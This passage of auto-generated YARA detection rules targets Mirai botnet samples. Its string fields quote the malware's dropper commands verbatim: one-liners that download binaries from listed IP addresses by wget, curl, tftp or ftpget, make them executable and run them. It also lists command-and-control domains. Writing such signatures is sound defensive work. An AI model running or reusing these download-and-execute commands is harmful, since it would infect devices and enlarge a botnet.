      $s1 = "FTPjGNRGP\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__c0f721ea {
   meta:
      description = "dropzone - file Mirai(signature)_c0f721ea.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "c0f721eafd844af7c9b10c682eecb690e39032f2588e7a787e0e969754833957"
   strings:
      $s1 = "N^NuPOST /cdn-cgi/" fullword ascii /* score: '13.00'*/
      $s2 = "FTPjGNRGP\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__656db993 {
   meta:
      description = "dropzone - file Mirai(signature)_656db993.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "656db993f51939676aa87d7707c11046820c44fc4bfc6ccd76eb912c6094c34f"
   strings:
      $s1 = "u__get_myaddress: socket" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 600KB and
      all of them
}

rule Mirai_signature__2f41a835 {
   meta:
      description = "dropzone - file Mirai(signature)_2f41a835.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "2f41a835cb6bc86899353a027422a36158febfc62eca6f521916431b42dbeef2"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.5.63.89/00101010101001/morte.ppc; curl -O http://163.5.63" ascii /* score: '33.00'*/
      $x2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.5.63.89/00101010101001/morte.arm; curl -O http://163.5.63" ascii /* score: '33.00'*/
      $x3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.5.63.89/00101010101001/morte.spc; curl -O http://163.5.63" ascii /* score: '33.00'*/
      $x4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.5.63.89/00101010101001/morte.arc; curl -O http://163.5.63" ascii /* score: '33.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.5.63.89/00101010101001/morte.spc; curl -O http://163.5.63" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.5.63.89/00101010101001/morte.x86_64; curl -O http://163.5" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.5.63.89/00101010101001/morte.sh4; curl -O http://163.5.63" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.5.63.89/00101010101001/morte.arm; curl -O http://163.5.63" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.5.63.89/00101010101001/morte.arm7; curl -O http://163.5.6" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.5.63.89/00101010101001/morte.arc; curl -O http://163.5.63" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.5.63.89/00101010101001/morte.mips; curl -O http://163.5.6" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.5.63.89/00101010101001/morte.mpsl; curl -O http://163.5.6" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.5.63.89/00101010101001/morte.x86; curl -O http://163.5.63" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.5.63.89/00101010101001/morte.i686; curl -O http://163.5.6" ascii /* score: '30.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.5.63.89/00101010101001/morte.i468; curl -O http://163.5.6" ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 9KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__77118b43 {
   meta:
      description = "dropzone - file Mirai(signature)_77118b43.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "77118b438e2442a04d8f1ef8e86a5a0f89d9be9c35dd9cf5d592c899ffe82b1b"
   strings:
      $x1 = "cd /tmp; wget http://163.61.39.201/arm; curl -O http://163.61.39.201/arm; ftpget -v 163.61.39.201 arm arm; chmod 777 arm; ./arm " ascii /* score: '34.00'*/
      $x2 = "cd /tmp; wget http://163.61.39.201/ppc; curl -O http://163.61.39.201/ppc; ftpget -v 163.61.39.201 ppc ppc; chmod 777 ppc; ./ppc " ascii /* score: '34.00'*/
      $x3 = "cd /tmp; wget http://163.61.39.201/spc; curl -O http://163.61.39.201/spc; ftpget -v 163.61.39.201 spc spc; chmod 777 spc; ./spc " ascii /* score: '34.00'*/
      $x4 = "cd /tmp; wget http://163.61.39.201/x86; curl -O http://163.61.39.201/x86; ftpget -v 163.61.39.201 x86 x86; chmod 777 x86; ./x86 " ascii /* score: '31.00'*/
      $x5 = "cd /tmp; wget http://163.61.39.201/arm7; curl -O http://163.61.39.201/arm7; ftpget -v 163.61.39.201 arm7 arm7; chmod 777 arm7; ." ascii /* score: '31.00'*/
      $x6 = "cd /tmp; wget http://163.61.39.201/x86; curl -O http://163.61.39.201/x86; ftpget -v 163.61.39.201 x86 x86; chmod 777 x86; ./x86 " ascii /* score: '31.00'*/
      $x7 = "cd /tmp; wget http://163.61.39.201/mpsl; curl -O http://163.61.39.201/mpsl; ftpget -v 163.61.39.201 mpsl mpsl; chmod 777 mpsl; ." ascii /* score: '31.00'*/
      $x8 = "cd /tmp; wget http://163.61.39.201/x86_64; curl -O http://163.61.39.201/x86_64; ftpget -v 163.61.39.201 x86_64 x86_64; chmod 777" ascii /* score: '31.00'*/
      $x9 = "cd /tmp; wget http://163.61.39.201/m68k; curl -O http://163.61.39.201/m68k; ftpget -v 163.61.39.201 m68k m68k; chmod 777 m68k; ." ascii /* score: '31.00'*/
      $x10 = "cd /tmp; wget http://163.61.39.201/i486; curl -O http://163.61.39.201/i486; ftpget -v 163.61.39.201 i486 i486; chmod 777 i486; ." ascii /* score: '31.00'*/
      $x11 = "cd /tmp; wget http://163.61.39.201/sh4; curl -O http://163.61.39.201/sh4; ftpget -v 163.61.39.201 sh4 sh4; chmod 777 sh4; ./sh4 " ascii /* score: '31.00'*/
      $x12 = "cd /tmp; wget http://163.61.39.201/i686; curl -O http://163.61.39.201/i686; ftpget -v 163.61.39.201 i686 i686; chmod 777 i686; ." ascii /* score: '31.00'*/
      $x13 = "cd /tmp; wget http://163.61.39.201/mips; curl -O http://163.61.39.201/mips; ftpget -v 163.61.39.201 mips mips; chmod 777 mips; ." ascii /* score: '31.00'*/
      $x14 = "cd /tmp; wget http://163.61.39.201/arm6; curl -O http://163.61.39.201/arm6; ftpget -v 163.61.39.201 arm6 arm6; chmod 777 arm6; ." ascii /* score: '31.00'*/
      $x15 = "cd /tmp; wget http://163.61.39.201/m68k; curl -O http://163.61.39.201/m68k; ftpget -v 163.61.39.201 m68k m68k; chmod 777 m68k; ." ascii /* score: '31.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 7KB and
      1 of ($x*)
}

rule Mirai_signature__97b61cd7 {
   meta:
      description = "dropzone - file Mirai(signature)_97b61cd7.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "97b61cd74c3a63809607412e9b7b0d09d08b34cc2f60782bdc9e5bf6e78bb644"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.73.24/bins/morte.spc; curl -O http://196.251.73.24/bi" ascii /* score: '33.00'*/
      $x2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.73.24/bins/morte.ppc; curl -O http://196.251.73.24/bi" ascii /* score: '33.00'*/
      $x3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.73.24/bins/morte.arm; curl -O http://196.251.73.24/bi" ascii /* score: '33.00'*/
      $x4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.73.24/bins/morte.arc; curl -O http://196.251.73.24/bi" ascii /* score: '33.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.73.24/bins/morte.m68k; curl -O http://196.251.73.24/b" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.73.24/bins/morte.x86; curl -O http://196.251.73.24/bi" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.73.24/bins/morte.x86_64; curl -O http://196.251.73.24" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.73.24/bins/morte.arm6; curl -O http://196.251.73.24/b" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.73.24/bins/morte.i686; curl -O http://196.251.73.24/b" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.73.24/bins/morte.ppc; curl -O http://196.251.73.24/bi" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.73.24/bins/morte.sh4; curl -O http://196.251.73.24/bi" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.73.24/bins/morte.arc; curl -O http://196.251.73.24/bi" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.73.24/bins/morte.spc; curl -O http://196.251.73.24/bi" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.73.24/bins/morte.arm; curl -O http://196.251.73.24/bi" ascii /* score: '30.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.73.24/bins/morte.i468; curl -O http://196.251.73.24/b" ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 8KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__b7a9a0ba {
   meta:
      description = "dropzone - file Mirai(signature)_b7a9a0ba.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "b7a9a0ba03113005d17ef270177fed0cd993c126f59288eb3f8c242decd19a14"
   strings:
      $x1 = "cd /tmp; wget http://163.61.39.201/arm; curl -O http://163.61.39.201/arm; ftpget -v 163.61.39.201 arm arm; chmod 777 arm; ./arm " ascii /* score: '34.00'*/
      $x2 = "cd /tmp; wget http://163.61.39.201/ppc; curl -O http://163.61.39.201/ppc; ftpget -v 163.61.39.201 ppc ppc; chmod 777 ppc; ./ppc " ascii /* score: '34.00'*/
      $x3 = "cd /tmp; wget http://163.61.39.201/spc; curl -O http://163.61.39.201/spc; ftpget -v 163.61.39.201 spc spc; chmod 777 spc; ./spc " ascii /* score: '34.00'*/
      $x4 = "cd /tmp; wget http://163.61.39.201/x86; curl -O http://163.61.39.201/x86; ftpget -v 163.61.39.201 x86 x86; chmod 777 x86; ./x86 " ascii /* score: '31.00'*/
      $x5 = "cd /tmp; wget http://163.61.39.201/mpsl; curl -O http://163.61.39.201/mpsl; ftpget -v 163.61.39.201 mpsl mpsl; chmod 777 mpsl; ." ascii /* score: '31.00'*/
      $x6 = "cd /tmp; wget http://163.61.39.201/mips; curl -O http://163.61.39.201/mips; ftpget -v 163.61.39.201 mips mips; chmod 777 mips; ." ascii /* score: '31.00'*/
      $x7 = "cd /tmp; wget http://163.61.39.201/arm6; curl -O http://163.61.39.201/arm6; ftpget -v 163.61.39.201 arm6 arm6; chmod 777 arm6; ." ascii /* score: '31.00'*/
      $x8 = "cd /tmp; wget http://163.61.39.201/m68k; curl -O http://163.61.39.201/m68k; ftpget -v 163.61.39.201 m68k m68k; chmod 777 m68k; ." ascii /* score: '31.00'*/
      $x9 = "cd /tmp; wget http://163.61.39.201/sh4; curl -O http://163.61.39.201/sh4; ftpget -v 163.61.39.201 sh4 sh4; chmod 777 sh4; ./sh4 " ascii /* score: '31.00'*/
      $x10 = "cd /tmp; wget http://163.61.39.201/arm7; curl -O http://163.61.39.201/arm7; ftpget -v 163.61.39.201 arm7 arm7; chmod 777 arm7; ." ascii /* score: '31.00'*/
      $x11 = "cd /tmp; wget http://163.61.39.201/i486; curl -O http://163.61.39.201/i486; ftpget -v 163.61.39.201 i486 i486; chmod 777 i486; ." ascii /* score: '31.00'*/
      $x12 = "cd /tmp; wget http://163.61.39.201/x86_64; curl -O http://163.61.39.201/x86_64; ftpget -v 163.61.39.201 x86_64 x86_64; chmod 777" ascii /* score: '31.00'*/
      $x13 = "cd /tmp; wget http://163.61.39.201/i686; curl -O http://163.61.39.201/i686; ftpget -v 163.61.39.201 i686 i686; chmod 777 i686; ." ascii /* score: '31.00'*/
      $x14 = "cd /tmp; wget http://163.61.39.201/spc; curl -O http://163.61.39.201/spc; ftpget -v 163.61.39.201 spc spc; chmod 777 spc; ./spc " ascii /* score: '31.00'*/
      $x15 = "cd /tmp; wget http://163.61.39.201/ppc; curl -O http://163.61.39.201/ppc; ftpget -v 163.61.39.201 ppc ppc; chmod 777 ppc; ./ppc " ascii /* score: '31.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 7KB and
      1 of ($x*)
}

rule Mirai_signature__ca461a9d {
   meta:
      description = "dropzone - file Mirai(signature)_ca461a9d.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "ca461a9de67d388331b79d0d213ec1c12a481642fc826ab551458bc5c8d57a71"
   strings:
      $x1 = "tftp -r morte.ppc -g 196.251.73.24 ; chmod 777 * ; ./morte.ppc ; rm -rf morte.ppc ;" fullword ascii /* score: '32.00'*/
      $x2 = "tftp -r morte.arm -g 196.251.73.24 ; chmod 777 * ; ./morte.arm ; rm -rf morte.arm ;" fullword ascii /* score: '32.00'*/
      $s3 = "wget http://196.251.73.24/bins/morte.arm -O /var/HELL; chmod 777 /var/HELL; /var/HELL; rm -rf HELL;" fullword ascii /* score: '30.00'*/
      $s4 = "/bin/busybox wget http://196.251.73.24/bins/morte.arm -O /var/HELL; chmod 777 /var/HELL; /var/HELL; rm -rf HELL;" fullword ascii /* score: '30.00'*/
      $s5 = "wget http://196.251.73.24/bins/morte.arm -O HELL; chmod 777 HELL; ./HELL; rm -rf HELL;" fullword ascii /* score: '30.00'*/
      $s6 = "wget http://196.251.73.24/bins/morte.ppc -O /var/HELL; chmod 777 /var/HELL; /var/HELL; rm -rf HELL;" fullword ascii /* score: '30.00'*/
      $s7 = "wget http://196.251.73.24/bins/morte.ppc -O HELL; chmod 777 HELL; ./HELL; rm -rf HELL;" fullword ascii /* score: '30.00'*/
      $s8 = "/bin/busybox wget http://196.251.73.24/bins/morte.ppc -O /var/HELL; chmod 777 /var/HELL; /var/HELL; rm -rf HELL;" fullword ascii /* score: '30.00'*/
      $s9 = "tftp -r morte.arm6 -g 196.251.73.24 ; chmod 777 * ; ./morte.arm6 ; rm -rf morte.arm6 ;" fullword ascii /* score: '29.00'*/
      $s10 = "tftp -r morte.mpsl -g 196.251.73.24 ; chmod 777 * ; ./morte.mpsl ; rm -rf morte.mpsl ;" fullword ascii /* score: '29.00'*/
      $s11 = "tftp -r morte.i686 -g 196.251.73.24 ; chmod 777 * ; ./morte.i686 ; rm -rf morte.i686 ;" fullword ascii /* score: '29.00'*/
      $s12 = "tftp -r morte.m68k -g 196.251.73.24 ; chmod 777 * ; ./morte.m68k ; rm -rf morte.m68k ;" fullword ascii /* score: '29.00'*/
      $s13 = "tftp -r morte.arm5 -g 196.251.73.24 ; chmod 777 * ; ./morte.arm5 ; rm -rf morte.arm5 ;" fullword ascii /* score: '29.00'*/
      $s14 = "tftp -r morte.x86_64 -g 196.251.73.24 ; chmod 777 * ; ./morte.x86_64 ; rm -rf morte.x86_64 ;" fullword ascii /* score: '29.00'*/
      $s15 = "tftp -r morte.sh4 -g 196.251.73.24 ; chmod 777 * ; ./morte.sh4 ; rm -rf morte.sh4 ;" fullword ascii /* score: '29.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule Mirai_signature__e5671c61 {
   meta:
      description = "dropzone - file Mirai(signature)_e5671c61.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "e5671c6187434d034fb811912b2df7b07a60f67b73e174c1a800758f704fad93"
   strings:
      $s1 = "[0clKillerStat] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s2 = "[0clKillerMaps] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s3 = "[0clKillerKillerEXE] Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s4 = "softbot.arm" fullword ascii /* score: '10.00'*/
      $s5 = "dockerd" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__3ac61cfc {
   meta:
      description = "dropzone - file Mirai(signature)_3ac61cfc.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "3ac61cfcbf4834a7da7e28af8ffdbf33288df84d4eae9c7ef24ad7962f7088bd"
   strings:
      $s1 = "wget http://149.102.155.8/systemcl/mips; chmod 777 mips; ./mips mips" fullword ascii /* score: '23.00'*/
      $s2 = "wget http://149.102.155.8/systemcl/mpsl; chmod 777 mpsl; ./mpsl mpsl" fullword ascii /* score: '23.00'*/
      $s3 = "wget http://149.102.155.8/systemcl/spc; chmod 777 spc; ./spc spc" fullword ascii /* score: '23.00'*/
      $s4 = "wget http://149.102.155.8/systemcl/arm; chmod 777 arm; ./arm arm" fullword ascii /* score: '23.00'*/
      $s5 = "wget http://149.102.155.8/systemcl/m68k; chmod 777 m68k; ./m68k m68k" fullword ascii /* score: '23.00'*/
      $s6 = "wget http://149.102.155.8/systemcl/arm7; chmod 777 arm7; ./arm7 arm7" fullword ascii /* score: '23.00'*/
      $s7 = "wget http://149.102.155.8/systemcl/ppc; chmod 777 ppc; ./ppc ppc" fullword ascii /* score: '23.00'*/
      $s8 = "wget http://149.102.155.8/systemcl/arm6; chmod 777 arm6; ./arm6 arm6" fullword ascii /* score: '23.00'*/
      $s9 = "wget http://149.102.155.8/systemcl/x86_64; chmod 777 x86_64; ./x86_64 x86_64" fullword ascii /* score: '23.00'*/
      $s10 = "wget http://149.102.155.8/systemcl/x86; chmod 777 x86; ./x86 x86" fullword ascii /* score: '23.00'*/
      $s11 = "wget http://149.102.155.8/systemcl/sh4; chmod 777 sh4; ./sh4 sh4" fullword ascii /* score: '23.00'*/
      $s12 = "wget http://149.102.155.8/systemcl/arm5; chmod 777 arm5; ./arm5 arm5" fullword ascii /* score: '23.00'*/
   condition:
      uint16(0) == 0x6777 and filesize < 2KB and
      8 of them
}

rule Mirai_signature__68a55330 {
   meta:
      description = "dropzone - file Mirai(signature)_68a55330.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "68a55330c8b7eb8b6220475aeebd7cbd4c41f27d42889c375ff0a8e6fb0a113a"
   strings:
      $s1 = "/sbin/tftp" fullword ascii /* score: '12.00'*/
      $s2 = "/sbin/ftpget" fullword ascii /* score: '12.00'*/
      $s3 = "/sbin/wget" fullword ascii /* score: '12.00'*/
      $s4 = "/bin/wget" fullword ascii /* score: '9.00'*/
      $s5 = "/bin/ftpget" fullword ascii /* score: '9.00'*/
      $s6 = "/bin/tftp" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__5efff126 {
   meta:
      description = "dropzone - file Mirai(signature)_5efff126.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "5efff126538dffcf8366a5282483b6f8a928f66bfed2d7403345cf2c13db315e"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.90.99.175/bins/sora.ppc; curl -O http://45.90.99.175/bins/" ascii /* score: '38.00'*/
      $x2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.90.99.175/bins/sora.arm4; curl -O http://45.90.99.175/bins" ascii /* score: '35.00'*/
      $x3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.90.99.175/bins/sora.arm5; curl -O http://45.90.99.175/bins" ascii /* score: '35.00'*/
      $x4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.90.99.175/bins/sora.m68k; curl -O http://45.90.99.175/bins" ascii /* score: '35.00'*/
      $x5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.90.99.175/bins/sora.mpsl; curl -O http://45.90.99.175/bins" ascii /* score: '35.00'*/
      $x6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.90.99.175/bins/sora.mips; curl -O http://45.90.99.175/bins" ascii /* score: '35.00'*/
      $x7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.90.99.175/bins/sora.x86; curl -O http://45.90.99.175/bins/" ascii /* score: '35.00'*/
      $x8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.90.99.175/bins/sora.sh4; curl -O http://45.90.99.175/bins/" ascii /* score: '35.00'*/
      $x9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.90.99.175/bins/sora.arm7; curl -O http://45.90.99.175/bins" ascii /* score: '35.00'*/
      $x10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.90.99.175/bins/sora.arm6; curl -O http://45.90.99.175/bins" ascii /* score: '35.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.90.99.175/bins/sora.ppc; curl -O http://45.90.99.175/bins/" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.90.99.175/bins/sora.mips; curl -O http://45.90.99.175/bins" ascii /* score: '27.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.90.99.175/bins/sora.arm4; curl -O http://45.90.99.175/bins" ascii /* score: '27.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.90.99.175/bins/sora.x86; curl -O http://45.90.99.175/bins/" ascii /* score: '27.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.90.99.175/bins/sora.arm7; curl -O http://45.90.99.175/bins" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 5KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__7fab6538 {
   meta:
      description = "dropzone - file Mirai(signature)_7fab6538.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "7fab6538fd955e065987dc07a79ce23d59ca79d96703d1d9c6f3cb5b9a471c56"
   strings:
      $s1 = "[0clKillerStat] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s2 = "[0clKillerMaps] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s3 = "[0clKillerKillerEXE] Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s4 = "softbot.arm" fullword ascii /* score: '10.00'*/
      $s5 = "dockerd" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__a31272c8 {
   meta:
      description = "dropzone - file Mirai(signature)_a31272c8.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "a31272c8b4c81400bc1ffabf2d5fd255c2fe104786c4e1d8c27f68203530cae7"
   strings:
      $s1 = "[0clKillerStat] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s2 = "[0clKillerMaps] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s3 = "[0clKillerKillerEXE] Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s4 = "softbot.arm" fullword ascii /* score: '10.00'*/
      $s5 = "dockerd" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__de98d44e {
   meta:
      description = "dropzone - file Mirai(signature)_de98d44e.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "de98d44e8a6a656c39e9872f0144bf2a87aedd55d7956fc5147d786d709dce3c"
   strings:
      $s1 = "[0clKillerStat] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s2 = "[0clKillerMaps] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s3 = "[0clKillerKillerEXE] Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s4 = "softbot.arm" fullword ascii /* score: '10.00'*/
      $s5 = "dockerd" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__e6fe3e15 {
   meta:
      description = "dropzone - file Mirai(signature)_e6fe3e15.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "e6fe3e151aeab4e87be3cd5b256afa3e062c2f11d4910c2a56719f001fc0338c"
   strings:
      $s1 = "[0clKillerStat] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s2 = "[0clKillerMaps] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s3 = "[0clKillerKillerEXE] Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s4 = "softbot.arm" fullword ascii /* score: '10.00'*/
      $s5 = "dockerd" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__eb6d7976 {
   meta:
      description = "dropzone - file Mirai(signature)_eb6d7976.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "eb6d797683b6e4544f84968c43b73914c7a38c30fa567586b1f6cc9e5a9d53fb"
   strings:
      $s1 = "[0clKillerStat] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s2 = "[0clKillerMaps] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s3 = "[0clKillerKillerEXE] Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s4 = "softbot.arm" fullword ascii /* score: '10.00'*/
      $s5 = "dockerd" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__875d120c {
   meta:
      description = "dropzone - file Mirai(signature)_875d120c.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "875d120c59a32df027e2120c07af1afeed8522209bbb1343e18432f6d8c464cd"
   strings:
      $s1 = "cd /tmp; rm mips; wget http://103.176.20.59/mips; chmod 777 mips; ./mips faith" fullword ascii /* score: '27.00'*/
      $s2 = "cd /tmp; rm mpsl; wget http://103.176.20.59/mpsl; chmod 777 mpsl; ./mpsl faith" fullword ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x7923 and filesize < 1KB and
      all of them
}

rule Mirai_signature__95ef05ed {
   meta:
      description = "dropzone - file Mirai(signature)_95ef05ed.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "95ef05ede0b3f96e2d0c452bfd1ae223bda85853bf8cb72106fd45561c983a2f"
   strings:
      $s1 = "                <value>rm px86; curl --output px86 http://45.138.16.158/bins/px86; wget http://45.138.16.158/bins/px86; chmod 77" ascii /* score: '22.00'*/
      $s2 = "                <value>rm px86; curl --output px86 http://45.138.16.158/bins/px86; wget http://45.138.16.158/bins/px86; chmod 77" ascii /* score: '22.00'*/
      $s3 = "<beans xmlns=\"http://www.springframework.org/schema/beans\"" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x623c and filesize < 1KB and
      all of them
}

rule Mirai_signature__9e8fd3ca {
   meta:
      description = "dropzone - file Mirai(signature)_9e8fd3ca.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "9e8fd3ca3d4e7868675ed5fbf50d4088df9cc272aec5526badbc09d26f4ebe4b"
   strings:
      $s1 = "srcport" fullword ascii /* score: '11.00'*/
      $s2 = "conn.magicpacketlease.org" fullword ascii /* score: '10.00'*/
      $s3 = "down.magicpacketlease.org" fullword ascii /* score: '10.00'*/
      $s4 = "datarand" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__ab64fead {
   meta:
      description = "dropzone - file Mirai(signature)_ab64fead.elf"
